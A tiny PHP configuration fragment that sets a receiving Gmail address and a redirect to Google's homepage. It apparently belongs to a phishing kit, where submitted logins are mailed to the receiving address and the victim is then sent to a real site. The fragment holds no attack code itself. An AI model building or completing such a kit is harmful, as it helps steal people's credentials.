<?php 
$Receive_email="brianapplyby22@gmail.com";
$redirect="https://www.google.com/";
?>